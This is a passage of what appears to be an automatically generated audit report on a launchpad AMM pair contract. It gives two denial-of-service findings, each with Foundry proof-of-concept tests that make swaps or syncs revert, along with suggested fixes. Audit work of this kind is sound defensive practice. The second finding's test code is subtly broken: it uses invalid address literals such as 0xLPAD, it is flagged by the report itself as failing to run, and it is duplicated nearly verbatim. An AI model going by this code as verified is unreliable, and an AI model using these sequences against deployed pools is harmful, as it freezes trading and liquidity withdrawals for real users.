        uint112 newLaunchpadFee1
    ) private {
        ...
        uint112 totalLaunchpadFee0 = accruedLaunchpadFee0 + newLaunchpadFee0;
        uint112 totalLaunchpadFee1 = accruedLaunchpadFee1 + newLaunchpadFee1;

        uint32 blockTimestamp = uint32(block.timestamp % 2 ** 32);
        uint32 timeElapsed = blockTimestamp - blockTimestampLast; // overflow is desired
        if (timeElapsed > 0 && _reserve0 != 0 && _reserve1 != 0) {
            ...
            if (launchpadFeeDistributor > address(0)) {
                if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
                    delete accruedLaunchpadFee0;
                    delete accruedLaunchpadFee1;
                    _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
                }
            }
        } else if (launchpadFeeDistributor > address(0) && newLaunchpadFee0 | newLaunchpadFee1 > 0) {
            accruedLaunchpadFee0 = totalLaunchpadFee0;
            accruedLaunchpadFee1 = totalLaunchpadFee1;
            emit LaunchpadFeesAccrued(newLaunchpadFee0, newLaunchpadFee1);
        }
        ...
    }

    function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
        if ((fee0 | fee1) > 0) {
            address _token0 = token0;
            address _token1 = token1;
            address distributor = launchpadFeeDistributor;

            if (fee0 > 0) _safeApprove(_token0, distributor, uint256(fee0));
            if (fee1 > 0) _safeApprove(_token1, distributor, uint256(fee1));

            IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));

            emit LaunchpadFeesCollected(fee0, fee1);
        }
    }

_update() is invoked from:
- mint(): to update reserves after adding liquidity,
- burn(): to update reserves after removing liquidity,
- swap(): to update reserves and distribute fees after swaps,
- sync(): to force reserves to match balances,
- endRewardsAccrual(): when disabling launchpad rewards.

Whenever timeElapsed > 0 and totalLaunchpadFee0|totalLaunchpadFee1 > 0 and launchpadFeeDistributor != 0, _update() will call _distributeLaunchpadFees(), which calls IDistributor.addRewards(). If addRewards() reverts (e.g., due to a logic bug, gas exhaustion, an invariant check in Distributor, or misconfiguration of launchpadFeeDistributor to a reverting contract), then _update() reverts and so does the surrounding swap/mint/burn/sync/endRewardsAccrual call. Because users cannot bypass fee distribution once a Distributor is configured, a single broken Distributor deployment can brick the entire AMM pair for all users, causing a persistent denial-of-service.

## Impact
Because GTELaunchpadV2Pair._update() unconditionally calls the external Distributor when totalLaunchpad fees > 0, any revert by IDistributor.addRewards() bricks core AMM operations that depend on _update() (swap, mint, burn, sync). Critically, only the configured Distributor can call endRewardsAccrual(), and there is no admin setter to disable or change launchpadFeeDistributor. Once non-zero launchpad fees have accrued (e.g., a swap in the same block), any subsequent call with timeElapsed > 0 will revert, permanently halting trading and preventing LP withdrawals on that pair until the Distributor behaves. This is a persistent DoS leading to asset unavailability.

## Command to Run Test


## Proof of Concept
High-level steps to deterministically trigger the DoS:

1) Deploy a RevertingDistributor whose addRewards() always reverts.
2) Deploy GTELaunchpadV2PairFactory with launchpad and launchpadLp addresses, and pass the RevertingDistributor address as launchpadFeeDistributor.
3) From the launchpad address, create a pair via createPair(token0, token1).
4) Seed liquidity properly: transfer token0 and token1 to the pair, then call pair.mint(launchpadLp). This sets non-zero reserves and initializes blockTimestampLast.
5) In the same block (no warp), perform a small swap that sends token0 in and takes a tiny amount1Out. Because timeElapsed == 0, _update() accrues launchpad fees instead of distributing them (accruedLaunchpadFee* > 0), and the swap succeeds.
6) Advance time by at least 1 second to make timeElapsed > 0.
7) Call pair.sync() (or mint/burn/swap). _update() now detects accrued fees and attempts _distributeLaunchpadFees(), which calls RevertingDistributor.addRewards() and reverts. This bricks subsequent operations as long as accrued fees remain and the Distributor keeps reverting.

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import "contracts/launchpad/uniswap/GTELaunchpadV2PairFactory.sol";
import "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import "contracts/launchpad/interfaces/IDistributor.sol";

interface IERC20Minimal {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    function totalSupply() external view returns (uint256);
    function balanceOf(address owner) external view returns (uint256);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 value) external returns (bool);
    function transfer(address to, uint256 value) external returns (bool);
    function transferFrom(address from, address to, uint256 value) external returns (bool);
}

contract RevertingDistributor is IDistributor {
    function getUserData(address, address) external pure returns (UserRewardData memory) { revert(); }
    function getUserDataForTokens(address[] calldata, address) external pure returns (UserRewardData[] memory) { revert(); }
    function increaseStake(address, address, uint96) external pure returns (uint256, uint256) { revert(); }
    function decreaseStake(address, address, uint96) external pure returns (uint256, uint256) { revert(); }
    function claimRewards(address) external pure returns (uint256, uint256) { revert(); }
    function addRewards(address, address, uint128, uint128) external pure override { revert("dist revert"); }
    function createRewardsPair(address, address) external pure {}
    function endRewards(IGTELaunchpadV2Pair) external pure {}
}

contract MockERC20 is IERC20Minimal {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    uint256 public override totalSupply;
    mapping(address => uint256) public override balanceOf;
    mapping(address => mapping(address => uint256)) public override allowance;

    constructor(string memory _n, string memory _s) { name = _n; symbol = _s; }

    function approve(address spender, uint256 value) external override returns (bool) {
        allowance[msg.sender][spender] = value;
        emit Approval(msg.sender, spender, value);
        return true;
    }

    function transfer(address to, uint256 value) external override returns (bool) {
        balanceOf[msg.sender] -= value;
        balanceOf[to] += value;
        emit Transfer(msg.sender, to, value);
        return true;
    }

    function transferFrom(address from, address to, uint256 value) external override returns (bool) {
        uint256 a = allowance[from][msg.sender];
        if (a != type(uint256).max) allowance[from][msg.sender] = a - value;
        balanceOf[from] -= value;
        balanceOf[to] += value;
        emit Transfer(from, to, value);
        return true;
    }

    function mint(address to, uint256 value) external {
        totalSupply += value;
        balanceOf[to] += value;
        emit Transfer(address(0), to, value);
    }

    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Transfer(address indexed from, address indexed to, uint256 value);
}

contract DistributorDoSTest is Test {
    GTELaunchpadV2PairFactory factory;
    GTELaunchpadV2Pair pair;
    MockERC20 token0;
    MockERC20 token1;
    RevertingDistributor distributor;

    address launchpad = address(0xA1);
    address launchpadLp = address(0xA2);

    function setUp() public {
        distributor = new RevertingDistributor();
        factory = new GTELaunchpadV2PairFactory(address(this), launchpad, launchpadLp, address(distributor));
        token0 = new MockERC20("T0","T0");
        token1 = new MockERC20("T1","T1");

        vm.prank(launchpad);
        address p = factory.createPair(address(token0), address(token1));
        pair = GTELaunchpadV2Pair(payable(p));

        // Seed liquidity correctly: transfer tokens to pair, then mint
        token0.mint(address(this), 1_000e18);
        token1.mint(address(this), 1_000e18);
        token0.transfer(address(pair), 1_000e18);
        token1.transfer(address(pair), 1_000e18);
        pair.mint(launchpadLp);
    }

    function test_DoS_via_RevertingDistributor() public {
        // 1) Accrue launchpad fees in the same block (timeElapsed == 0) so no distribution is attempted yet
        address trader = address(0xBEEF);
        token0.mint(trader, 10e18);
        vm.startPrank(trader);
        // Pre-fund pair with input token, then swap out a tiny amount of token1
        token0.transfer(address(pair), 5e18);
        pair.swap(0, 1e15, trader, ""); // succeeds, fees accrued but not distributed (timeElapsed == 0)
        vm.stopPrank();

        // Sanity: accrued fees should be > 0 now
        (uint112 acc0, uint112 acc1, ) = pair.getAccruedLaunchpadFees();
        assertTrue(acc0 > 0 || acc1 > 0, "no fees accrued");

        // 2) Advance time so distribution will be attempted in _update and revert
        vm.warp(block.timestamp + 1);

        // Any path that reaches _update with totalLaunchpadFee>0 will revert; sync is the simplest
        vm.expectRevert(bytes("dist revert"));
        pair.sync();
    }
}


## Suggested Mitigation
Decouple external Distributor failures from core AMM state transitions:

- Wrap the external call in try/catch and only clear accruedLaunchpadFee* on success. On failure, keep fees accrued and skip distribution without reverting so trading and LP ops continue:
  - In _update(), compute totalLaunchpadFee* as today. Do not delete accruedLaunchpadFee* before the external call.
  - Attempt _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1) inside try/catch. On success, set accruedLaunchpadFee* = 0; on failure, leave them unchanged and proceed.
- Add an emergency governance-controlled method to disable or update launchpadFeeDistributor (e.g., set to address(0) or new distributor) so misconfiguration cannot permanently brick pairs. Alternatively, allow the Factory’s feeToSetter or a designated owner to perform this action.
- Best: move addRewards() to a separate pull-based function callable by anyone/keepers (distributeFees()), and have _update() only maintain reserves and accrue fees. This removes any external dependency from the hot path and avoids DoS from third-party failures.





 **Derived From** : Distributor / GTELaunchpadV2Pair / LaunchToken / Launchpad.RewardsTrackerLib.unstake / Distributor.decreaseStake / Distributor.endRewards / GTELaunchpadV2Pair.endRewardsAccrual / LaunchToken._decreaseFeeShares / Launchpad.endRewards

## [M-38]. Launch token AMM pair permanently DOSed when last fee-share holder exits, making all future swaps revert

### Finding Severity Justification: A realistic, permissionless state leads GTELaunchpadV2Pair.swap to revert whenever Distributor.addRewards is called with rs.totalShares == 0. This bricks swaps on the AMM pair (core trading availability) once the last fee-share holder exits post-unlock. No direct fund theft occurs, but protocol functionality (trading) is materially impacted.
## Derived From Pattern/Invariant
Distributor / GTELaunchpadV2Pair / LaunchToken / Launchpad.RewardsTrackerLib.unstake / Distributor.decreaseStake / Distributor.endRewards / GTELaunchpadV2Pair.endRewardsAccrual / LaunchToken._decreaseFeeShares / Launchpad.endRewards

## Exploit Type
AccountingInvariantViolation

## Location
GTELaunchpadV2Pair.swap

## Finding Status: Valid
## Status Confidence: Confident
### Finding Complexity: 7
### PoC Test Status: ErrorRunningTests
## Minimim Privilege Required:Permissionless


## Description
The launchpad-to-AMM fee distribution state machine is inconsistent between LaunchToken/Launchpad/Distributor and GTELaunchpadV2Pair. This leads to a state where the AMM pair still attempts to push launchpad fees into Distributor after all reward-sharing holders have exited, causing `swap()` to revert **forever** for that pair.

### Intended lifecycle

1. During bonding, users acquire fee-shares via LaunchToken._increaseFeeShares, which call Launchpad.increaseStake → Distributor.increaseStake, incrementing `RewardPoolData.totalShares(launchAsset)`.
2. After graduation:
   - Launchpad creates a GTELaunchpadV2Pair (LP) for (launchAsset, quoteAsset), sets `launchpadFeeDistributor = Distributor` and `launchpadLp`.
   - Swaps on this pair send a portion of swap fees to Distributor via `_distributeLaunchpadFees` → `Distributor.addRewards(...)`.
3. When no reward-share holder is left (totalShares == 0), the reward program should be turned off by calling `distributor.endRewards(pair)` → `pair.endRewardsAccrual()`, which sets `rewardsPoolActive = 0` and zeros accrued fees so that no further `addRewards` calls happen.

Invariant from the spec:
> "Whenever the last fee-share holder exits for a launch asset (LaunchToken.totalFeeShare == 0 and RewardPoolData.totalShares == 0), the corresponding GTELaunchpadV2Pair.rewardsPoolActive must be turned off BEFORE the next fee distribution; otherwise, addRewards must never be called when totalShares == 0."

### Actual implementation

**1. LaunchToken._decreaseFeeShares only ends rewards while `unlocked == false`:**
```solidity
function _decreaseFeeShares(address account, uint256 amount) internal {
    uint256 share = bondingShare[account];
    if (share == 0 || account == address(0)) return;
    ...
    totalFeeShare -= amount;
    bondingShare[account] -= amount;

    if (totalFeeShare == 0 && !unlocked) _endRewards();

    ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
}
```
- `_endRewards()` calls `Launchpad.endRewards()`, which computes the pair address and calls `distributor.endRewards(pair)`.
- After graduation, Launchpad._graduate calls `LaunchToken.unlock()` and sets `_launches[token].active = false` but **never** calls `endRewards()`.
- Once `unlocked == true`, subsequent `_decreaseFeeShares` calls can reduce `totalFeeShare` to zero, but the guard `&& !unlocked` prevents `_endRewards()` from running.

**2. Distributor.endRewards only toggles the pair, not its own pool:**
```solidity
function endRewards(IGTELaunchpadV2Pair pair) external onlyLaunchpad {
    pair.endRewardsAccrual();
}
```
- `endRewardsAccrual()` on GTELaunchpadV2Pair clears `accruedLaunchpadFee0/1` and sets `rewardsPoolActive = 0` but does **not** change `RewardPoolData.totalShares`.

**3. GTELaunchpadV2Pair continues to call `addRewards` whenever `rewardsPoolActive > 0`:**
```solidity
function swap(...) external lock {
    ...
    (uint112 launchpadFee0, uint112 launchpadFee1) = launchpadFeeDistributor > address(0)
        && rewardsPoolActive > 0 ? _getLaunchpadFees(amount0In, amount1In) : (0, 0);

    _update(balance0, balance1, _reserve0, _reserve1, launchpadFee0, launchpadFee1);
}

function _update(..., uint112 newLaunchpadFee0, uint112 newLaunchpadFee1) private {
    ...
    if (launchpadFeeDistributor > address(0)) {
        if (totalLaunchpadFee0 | totalLaunchpadFee1 > 0) {
            delete accruedLaunchpadFee0;
            delete accruedLaunchpadFee1;
            _distributeLaunchpadFees(totalLaunchpadFee0, totalLaunchpadFee1);
        }
    }
    ...
}

function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
    if ((fee0 | fee1) > 0) {
        ...
        IDistributor(distributor).addRewards(_token0, _token1, uint128(fee0), uint128(fee1));
    }
}
```

**4. Distributor.addRewards reverts if there are no shares:**
```solidity
function addRewards(address token0, address token1, uint128 amount0, uint128 amount1) external {
    (address launchAsset, address quoteAsset, uint128 launchAssetAmount, uint128 quoteAssetAmount) = ...;
    RewardPoolData storage rs = RewardsTrackerStorage.getRewardPool(token0);

    if (rs.quoteAsset == address(0)) {
        rs = RewardsTrackerStorage.getRewardPool(token1);
        if (rs.quoteAsset == address(0)) revert RewardsDoNotExist();
        ...
    }

    if (rs.totalShares == 0) revert NoSharesToIncentivize();
    ...
}
```

### Problematic states

There are two realistic ways to reach `totalShares == 0` while `rewardsPoolActive == 1`:

1. **Post-unlock exit of last fee-share holder**
   - Token has graduated: `Launchpad.launches[token].active == false`, LaunchToken.unlocked == true.
   - Users still hold bondingShares from the bonding phase; GTELaunchpadV2Pair has `rewardsPoolActive == 1` and `launchpadFeeDistributor` pointing at Distributor.
   - Over time, all fee-share holders transfer/sell their tokens. Every transfer with `from != launchpad` calls `_decreaseFeeShares`, which in turn calls `Distributor.decreaseStake` and eventually decrements `RewardPoolData.totalShares` to zero.
   - Because `unlocked == true`, `_endRewards()` is never called; `Launchpad.endRewards()` is never executed post-unlock.
   - Result: `RewardPoolData.totalShares(launchAsset) == 0` while `GTELaunchpadV2Pair.rewardsPoolActive == 1`.
   - The next AMM swap that generates launchpad fees triggers `_distributeLaunchpadFees` → `Distributor.addRewards(...)` → `revert NoSharesToIncentivize()` → **swap reverts**.

2. **All bonders exit before LP deployment**
   - During bonding (`unlocked == false`), all current fee-share holders fully sell back to Launchpad, driving `totalFeeShare == 0`.
   - In this case, `_endRewards()` *does* get called (`!unlocked` is true), which in turn calls `Launchpad.endRewards()`.
   - `Launchpad.endRewards()` computes the pair address via `pairFor(factory, token, quote)` and calls `distributor.endRewards(pair)`.
   - If the Uniswap pair has not yet been created, the address has no code. Calling `pair.endRewardsAccrual()` on a non-contract has no effect but does not revert.
   - Later, once the bonding curve sells out and the actual GTELaunchpadV2Pair is deployed at that deterministic address, it starts its life with `rewardsPoolActive == 1`, but the Distributor's reward pool may already have `totalShares == 0`.
   - Again, any future swap that accrues fees will eventually call `Distributor.addRewards` and hit `NoSharesToIncentivize()`.

### Impact

For any affected token pair:
- **All subsequent swaps on the GTELaunchpadV2Pair will revert** after the last fee-share holder exits and `totalShares == 0`.
- This effectively **bricks the AMM pool forever**, breaking all integrations and routing to that pair.
- This can occur via normal user behavior (everyone selling or moving their tokens), without any privileged or malicious action.

This is a clear state machine violation of the launchpad–rewards–AMM lifecycle and yields a DoS on the main liquidity venue for the launched token.

## Impact
Once all launchpad fee-share holders have exited, any further AMM swaps on the corresponding GTELaunchpadV2Pair revert with NoSharesToIncentivize(), permanently disabling trading in that pool and breaking downstream routers/aggregators.

## Command to Run Test


## Proof of Concept
The following Foundry test constructs a minimal environment with:
- A Distributor with an active rewards pair for (launchAsset, quoteAsset) but **zero** totalShares.
- A GTELaunchpadV2Pair configured with `launchpadFeeDistributor = Distributor` and some LP minted to `launchpadLp` so that launchpad fees are non-zero.
- A swap that triggers `_distributeLaunchpadFees` → `Distributor.addRewards(...)` which reverts because `rs.totalShares == 0`.

This simulates the bricked swap state after the last fee-share holder has exited.

```solidity
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";
import {IDistributor} from "contracts/launchpad/interfaces/IDistributor.sol";
import {IGTELaunchpadV2Pair} from "contracts/launchpad/uniswap/interfaces/IGTELaunchpadV2Pair.sol";

// Simple ERC20 token mock
contract ERC20Mock {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

// Minimal factory mock implementing feeTo()
contract MockUniV2Factory {
    address public feeToAddr;

    function setFeeTo(address a) external { feeToAddr = a; }

    function feeTo() external view returns (address) {
        return feeToAddr;
    }

    function createPair(address tokenA, address tokenB, address launchpadLp, address feeDistributor)
        external
        returns (address pair)
    {
        GTELaunchpadV2Pair p = new GTELaunchpadV2Pair();
        p.initialize(tokenA, tokenB, launchpadLp, feeDistributor);
        return address(p);
    }
}

contract LaunchpadRewardsDoSTest is Test {
    Distributor distributor;
    MockUniV2Factory factory;
    ERC20Mock token0; // launchAsset
    ERC20Mock token1; // quoteAsset
    GTELaunchpadV2Pair pair;

    address launchpad = address(0xLPAD);
    address launchpadLp = address(0xLPLP);

    function setUp() public {
        // Setup Distributor with launchpad
        distributor = new Distributor();
        distributor.initialize(launchpad);

        token0 = new ERC20Mock("Base", "B");
        token1 = new ERC20Mock("Quote", "Q");

        // Launchpad creates rewards pair for (token0, token1)
        vm.prank(launchpad);
        distributor.createRewardsPair(address(token0), address(token1));

        // At this point, RewardPoolData.totalShares == 0 (no one has staked yet),
        // but quoteAsset is set, so addRewards will check totalShares and revert with NoSharesToIncentivize.

        // Deploy pair via mock factory
        factory = new MockUniV2Factory();
        address pairAddr = factory.createPair(address(token0), address(token1), launchpadLp, address(distributor));
        pair = GTELaunchpadV2Pair(pairAddr);

        // Mint initial liquidity to pair and mint LP tokens to launchpadLp
        // so that _getLaunchpadFees() will compute a non-zero share
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);

        // No feeTo => feeOn = false in mint
        pair.mint(launchpadLp);

        // Sanity: rewardsPoolActive should be 1 (active)
        assertEq(pair.rewardsPoolActive(), 1);
    }

    function testSwapRevertsWhenNoSharesToIncentivize() public {
        // Prepare a swap that generates non-zero launchpad fees
        // Send some amount of token0 into the pair so amount0In > 0
        token0.mint(address(this), 100 ether);
        token0.transfer(address(pair), 100 ether);

        // Try to swap out some token1; this will:
        // - compute amount0In > 0
        // - compute launchpadFee0 > 0 in _getLaunchpadFees
        // - call _distributeLaunchpadFees -> distributor.addRewards
        // - addRewards sees rs.totalShares == 0 and reverts NoSharesToIncentivize()

        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 10 ether, address(this), "");
    }
}
```

This test demonstrates that when `RewardPoolData.totalShares == 0` and `rewardsPoolActive == 1`, **every swap reverts**, matching the problematic state reachable on mainnet when all fee-share holders have exited post-unlock (or before pair deployment).

## Proof of Code
pragma solidity 0.8.27;

import "forge-std/Test.sol";
import {GTELaunchpadV2Pair} from "contracts/launchpad/uniswap/GTELaunchpadV2Pair.sol";
import {Distributor} from "contracts/launchpad/Distributor.sol";

contract ERC20Mock2 {
    string public name;
    string public symbol;
    uint8 public decimals = 18;
    mapping(address => uint256) public balanceOf;
    mapping(address => mapping(address => uint256)) public allowance;

    constructor(string memory n, string memory s) { name = n; symbol = s; }

    function transfer(address to, uint256 amount) external returns (bool) {
        balanceOf[msg.sender] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function transferFrom(address from, address to, uint256 amount) external returns (bool) {
        uint256 allowed = allowance[from][msg.sender];
        if (allowed != type(uint256).max) allowance[from][msg.sender] = allowed - amount;
        balanceOf[from] -= amount;
        balanceOf[to] += amount;
        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {
        allowance[msg.sender][spender] = amount;
        return true;
    }

    function mint(address to, uint256 amount) external {
        balanceOf[to] += amount;
    }
}

contract MockUniV2Factory2 {
    address public feeToAddr;

    function setFeeTo(address a) external { feeToAddr = a; }

    function feeTo() external view returns (address) {
        return feeToAddr;
    }

    function createPair(address tokenA, address tokenB, address launchpadLp, address feeDistributor)
        external
        returns (address pair)
    {
        GTELaunchpadV2Pair p = new GTELaunchpadV2Pair();
        p.initialize(tokenA, tokenB, launchpadLp, feeDistributor);
        return address(p);
    }
}

contract LaunchpadPairDoSTest is Test {
    Distributor distributor;
    MockUniV2Factory2 factory;
    ERC20Mock2 token0; // launchAsset
    ERC20Mock2 token1; // quoteAsset
    GTELaunchpadV2Pair pair;

    address launchpad = address(0xLPAD);
    address launchpadLp = address(0xLPLP);

    function setUp() public {
        distributor = new Distributor();
        distributor.initialize(launchpad);

        token0 = new ERC20Mock2("Base", "B");
        token1 = new ERC20Mock2("Quote", "Q");

        // Configure reward pool for (token0, token1) but with zero totalShares
        vm.prank(launchpad);
        distributor.createRewardsPair(address(token0), address(token1));

        factory = new MockUniV2Factory2();
        address pairAddr = factory.createPair(address(token0), address(token1), launchpadLp, address(distributor));
        pair = GTELaunchpadV2Pair(pairAddr);

        // Provide initial liquidity to the pair and mint LP tokens to launchpadLp
        token0.mint(address(pair), 1000 ether);
        token1.mint(address(pair), 1000 ether);

        pair.mint(launchpadLp);

        // Sanity: rewardsPoolActive is 1
        assertEq(pair.rewardsPoolActive(), 1, "rewardsPoolActive must start as 1");
    }

    function testSwapDOSWhenNoShares() public {
        // Send token0 in so that swap has non-zero amount0In and generates launchpad fees
        token0.mint(address(this), 100 ether);
        token0.transfer(address(pair), 100 ether);

        // Expect Distributor.NoSharesToIncentivize revert during swap
        vm.expectRevert(Distributor.NoSharesToIncentivize.selector);
        pair.swap(0, 10 ether, address(this), "");
    }
}


## Suggested Mitigation
Ensure that the rewards program for a launch asset is *always* deactivated at the moment `RewardPoolData.totalShares` reaches zero, regardless of whether the token is still locked or already unlocked, and retry deactivation when the LP is actually deployed.

Concrete steps:

1. **Remove the `!unlocked` guard in LaunchToken._decreaseFeeShares:**
   ```solidity
   function _decreaseFeeShares(address account, uint256 amount) internal {
       ...
       totalFeeShare -= amount;
       bondingShare[account] -= amount;

       // BEFORE: if (totalFeeShare == 0 && !unlocked) _endRewards();
       // AFTER: always end rewards when totalFeeShare == 0
       if (totalFeeShare == 0) _endRewards();

       ILaunchpad(launchpad).decreaseStake(account, uint96(amount));
   }
   ```
   - This guarantees that whenever the last fee-share holder exits (before or after unlock), Launchpad.endRewards() is called.

2. **Make Launchpad.endRewards() idempotent and robust to missing pair:**
   - Modify `Launchpad.endRewards` to:
     - Check if the pair actually exists via `IUniswapV2FactoryMinimal.getPair` or `extcodesize(pair) > 0`.
     - If the pair does not exist yet, record a flag in Launchpad state (e.g., `pendingEndRewards[token] = true`) so that upon LP creation/graduation, Launchpad can immediately call endRewardsAccrual on the real pair.
   Example sketch:
   ```solidity
   mapping(address => bool) public rewardsEnded;

   function endRewards() external onlyLaunchAsset {
       address launchAsset = msg.sender;
       address quote = _launches[launchAsset].quote;
       address factory = address(uniV2Factory);
       IUniswapV2Pair pair = pairFor(factory, launchAsset, quote);

       // Only call if pair code is present
       if (address(pair).code.length > 0) {
           distributor.endRewards(IGTELaunchpadV2Pair(address(pair)));
           rewardsEnded[launchAsset] = true;
       } else {
           // Defer: mark as pending so _createPairAndSwapRemaining or a dedicated hook can call it later
           rewardsEnded[launchAsset] = true;
       }
   }

   // After creating LP in _createPairAndSwapRemaining, if rewardsEnded[token] is true,
   // immediately call distributor.endRewards(pair) to turn off accrual.
   ```

3. **Optional defensive check in GTELaunchpadV2Pair:**
   - As an extra safety net, guard `_distributeLaunchpadFees` by checking with Distributor whether the pool has shares, and if not, simply accumulate fees without calling `addRewards`:
   ```solidity
   function _distributeLaunchpadFees(uint112 fee0, uint112 fee1) internal {
       if ((fee0 | fee1) == 0) return;
       address distributor = launchpadFeeDistributor;

       // Query Distributor cheaply (e.g., a view that returns totalShares for the launch asset) and
       // skip addRewards if totalShares == 0 to avoid reverting swaps.
   }
   ```

With these changes, whenever the reward pool becomes empty, `rewardsPoolActive` is turned off in the pair (via endRewardsAccrual) before the next fee distribution, and GTELaunchpadV2Pair.swap will no longer attempt to call `addRewards` in a state where `totalShares == 0`.




